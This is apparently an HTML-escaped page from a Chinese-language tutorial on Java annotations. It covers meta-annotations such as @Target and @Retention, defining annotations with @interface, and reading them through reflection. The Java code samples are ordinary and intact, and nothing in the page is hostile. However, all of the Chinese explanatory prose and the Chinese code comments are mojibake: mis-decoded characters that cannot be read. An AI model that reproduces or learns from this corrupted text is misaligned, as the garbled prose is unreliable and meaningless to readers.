&lt;p>&lt;code>@Override&lt;/code>ï¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ­£ç¡®åœ°å®ç°äº†è¦†å†™&lt;/p>
&lt;p>&lt;code>@SuppressWarnings&lt;/code>ï¼šå‘Šè¯‰ç¼–è¯‘å™¨å¿½ç•¥æ­¤å¤„ä»£ç äº§ç”Ÿçš„è­¦å‘Š&lt;/p>
&lt;ul>
&lt;li>2 ç”±å·¥å…·å¤„ç†&lt;code>.class&lt;/code>æ–‡ä»¶ä½¿ç”¨çš„æ³¨è§£ï¼šæœ‰äº›å·¥å…·ä¼šåœ¨åŠ è½½classçš„æ—¶å€™ï¼Œå¯¹classåšåŠ¨æ€ä¿®æ”¹ï¼Œå®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ï¼›è¿™ç±»æ³¨è§£ä¼šè¢«ç¼–è¯‘è¿›å…¥&lt;code>.class&lt;/code>æ–‡ä»¶ï¼Œä½†åŠ è½½ç»“æŸåå¹¶ä¸ä¼šå­˜åœ¨äºå†…å­˜ä¸­&lt;/li>
&lt;li>3 ç¨‹åºè¿è¡ŒæœŸå¯è¯»å–çš„æ³¨è§£ï¼šåŠ è½½åä¸€ç›´å­˜åœ¨äºJVMä¸­ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ³¨è§£&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@PostConstruct&lt;/code>ï¼šé…ç½®äº†å®ƒçš„æ–¹æ³•ä¼šåœ¨è°ƒç”¨æ„é€ æ–¹æ³•åè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œè¿™æ˜¯Javaä»£ç è¯»å–è¯¥æ³¨è§£å®ç°çš„åŠŸèƒ½ï¼ŒJVMå¹¶ä¸ä¼šè¯†åˆ«è¯¥æ³¨è§£&lt;/p>
&lt;ul>
&lt;li>å®šä¹‰ä¸€ä¸ªæ³¨è§£æ—¶ï¼Œè¿˜å¯ä»¥å®šä¹‰é…ç½®å‚æ•°ï¼Œé…ç½®å‚æ•°å¯ä»¥åŒ…æ‹¬ï¼šåŸºæœ¬ç±»å‹ï¼ŒStringï¼Œæšä¸¾ç±»ï¼ŒåŸºæœ¬ç±»å‹ã€Stringã€Classä»¥åŠæšä¸¾çš„æ•°ç»„ï¼›å¯ä»¥è®¾ç½®ç¼ºçœå€¼ï¼Œå¦‚æœåªå†™æ³¨è§£ï¼Œç›¸å½“äºå…¨éƒ¨ä½¿ç”¨é»˜è®¤å€¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">min&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">55&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// @Check(value=99)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>@Check&lt;/code>å°±æ˜¯ä¸€ä¸ªæ³¨è§£&lt;/p>
&lt;ul>
&lt;li>æœ‰ä¸€äº›æ³¨è§£å¯ä»¥ä¿®é¥°å…¶ä»–æ³¨è§£ï¼Œè¿™äº›æ³¨è§£å°±ç§°ä¸ºå…ƒæ³¨è§£Meta annotation&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Target&lt;/code>ï¼šä½¿ç”¨&lt;code>@Target&lt;/code>å¯ä»¥å®šä¹‰&lt;code>Annotation&lt;/code>èƒ½å¤Ÿè¢«åº”ç”¨äºæºç çš„å“ªäº›ä½ç½®&lt;/p>
&lt;pre tabindex="0">&lt;code>ç±»æˆ–æ¥å£ï¼šElementType.TYPE
å­—æ®µï¼šElementType.FIELD
æ–¹æ³•ï¼šElementType.METHOD
æ„é€ æ–¹æ³•ï¼šElementType.CONSTRUCTOR
æ–¹æ³•å‚æ•°ï¼šElementType.PARAMETER
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Retention&lt;/code>ï¼šå®šä¹‰äº†&lt;code>Annotation&lt;/code>çš„ç”Ÿå‘½å‘¨æœŸï¼Œé€šå¸¸æˆ‘ä»¬è‡ªå®šä¹‰çš„&lt;code>Annotation&lt;/code>éƒ½æ˜¯&lt;code>RUNTIME&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>ä»…ç¼–è¯‘æœŸï¼šRetentionPolicy.SOURCE ç¼–è¯‘å™¨è¢«ä¸¢æ‰ ä¸€èˆ¬ä¸ç”¨(ç¼–è¯‘å™¨ä½¿ç”¨)
ä»…classæ–‡ä»¶ï¼šRetentionPolicy.CLASS ä»…ä¿å­˜åœ¨classæ–‡ä»¶ä¸­ ä¸ä¼šè¢«åŠ è½½å…¥JVM(åº•å±‚å·¥å…·åº“ä½¿ç”¨ æ¶‰åŠclassçš„åŠ è½½)
è¿è¡ŒæœŸï¼šRetentionPolicy.RUNTIME ä¼šè¢«åŠ è½½è¿›JVM å¹¶åœ¨è¿è¡ŒæœŸè¢«ç¨‹åºè¯»å–(å¸¸ç”¨)
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Repeatable&lt;/code>ï¼šå®šä¹‰&lt;code>Annotation&lt;/code>æ˜¯å¦å¯é‡å¤&lt;/p>
&lt;p>&lt;code>@Inherited&lt;/code>ï¼šå®šä¹‰å­ç±»æ˜¯å¦å¯ç»§æ‰¿çˆ¶ç±»å®šä¹‰çš„&lt;code>Annotatio&lt;/code>ï¼Œä»…é’ˆå¯¹&lt;code>@Target(ElementType.TYPE)&lt;/code>ç±»å‹çš„&lt;code>annotation&lt;/code>æœ‰æ•ˆï¼Œå¹¶ä¸”ä»…é’ˆå¯¹&lt;code>class&lt;/code>çš„ç»§æ‰¿ï¼Œå¯¹&lt;code>interface&lt;/code>çš„ç»§æ‰¿æ— æ•ˆ&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨&lt;code>@interface&lt;/code>è¯­æ³•æ¥å®šä¹‰æ³¨è§£ï¼Œç”¨å…ƒæ³¨é‡Šæ¥é…ç½®æ³¨é‡Šï¼Œå…¶ä¸­&lt;code>@Target&lt;/code>å’Œ&lt;code>@Retention&lt;/code>(ä¸€èˆ¬è®¾ä¸ºRUNTIME)å¿…é¡»è®¾ç½®&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å¤„ç†æ³¨è§£">å¤„ç†æ³¨è§£&lt;/h3>
&lt;p>æ³¨è§£æœ¬èº«å¯¹ä»£ç é€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¦‚ä½•ä½¿ç”¨æ³¨è§£å®Œå…¨ç”±å·¥å…·å†³å®š&lt;/p>
&lt;p>æ³¨è§£å®šä¹‰åä¹Ÿæ˜¯ä¸€ç§&lt;code>class&lt;/code>ï¼Œæ‰€æœ‰çš„æ³¨è§£éƒ½ç»§æ‰¿è‡ª&lt;code>java.lang.annotation.Annotation&lt;/code>ï¼Œæ‰€ä»¥è¯»å–æ³¨è§£éœ€è¦ç”¨åˆ°åå°„&lt;/p>
&lt;p>åˆ¤æ–­æŸä¸ªæ³¨è§£æ˜¯å¦å­˜åœ¨äº&lt;code>Class&lt;/code>ã€&lt;code>Field&lt;/code>ã€&lt;code>Method&lt;/code>æˆ–&lt;code>Constructor&lt;/code>ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ¤æ–­@Reportæ˜¯å¦å­˜åœ¨äºPersonç±»:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åå°„APIè¯»å–Annotationï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–Personå®šä¹‰çš„@Reportæ³¨è§£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">level&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨åå°„APIè¯»å–&lt;code>Annotation&lt;/code>æœ‰ä¸¤ç§æ–¹æ³•ã€‚æ–¹æ³•ä¸€æ˜¯å…ˆåˆ¤æ–­&lt;code>Annotation&lt;/code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±ç›´æ¥è¯»å–ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ç›´æ¥è¯»å–&lt;code>Annotation&lt;/code>ï¼Œå¦‚æœ&lt;code>Annotation&lt;/code>ä¸å­˜åœ¨ï¼Œå°†è¿”å›&lt;code>null&lt;/code>ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯»å–æ–¹æ³•ã€å­—æ®µå’Œæ„é€ æ–¹æ³•çš„&lt;code>Annotation&lt;/code>å’ŒClassç±»ä¼¼ã€‚ä½†è¦è¯»å–æ–¹æ³•å‚æ•°çš„&lt;code>Annotation&lt;/code>å°±æ¯”è¾ƒéº»çƒ¦ä¸€ç‚¹ï¼Œå› ä¸ºæ–¹æ³•å‚æ•°æœ¬èº«å¯ä»¥çœ‹æˆä¸€ä¸ªæ•°ç»„ï¼Œè€Œæ¯ä¸ªå‚æ•°åˆå¯ä»¥å®šä¹‰å¤šä¸ªæ³¨è§£ï¼Œæ‰€ä»¥ï¼Œä¸€æ¬¡è·å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£å°±å¿…é¡»ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„æ¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå¯¹äºä»¥ä¸‹æ–¹æ³•å®šä¹‰çš„æ³¨è§£ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#75af00">@Range&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¦è¯»å–æ–¹æ³•å‚æ•°çš„æ³¨è§£ï¼Œæˆ‘ä»¬å…ˆç”¨åå°„è·å–&lt;code>Method&lt;/code>å®ä¾‹ï¼Œç„¶åè¯»å–æ–¹æ³•å‚æ•°çš„æ‰€æœ‰æ³¨è§£ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–Methodå®ä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–æ‰€æœ‰å‚æ•°çš„Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">annos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameterAnnotations&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆç´¢å¼•ä¸º0ï¼‰çš„æ‰€æœ‰Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">annos&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Annotation&lt;/span> &lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @Rangeæ³¨è§£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @NotNullæ³¨è§£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">NotNull&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®šä¹‰äº†æ³¨è§£ï¼Œæœ¬èº«å¯¹ç¨‹åºé€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¿…é¡»è‡ªå·±ç¼–å†™ä»£ç æ¥ä½¿ç”¨æ³¨è§£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FIELD&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">255&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
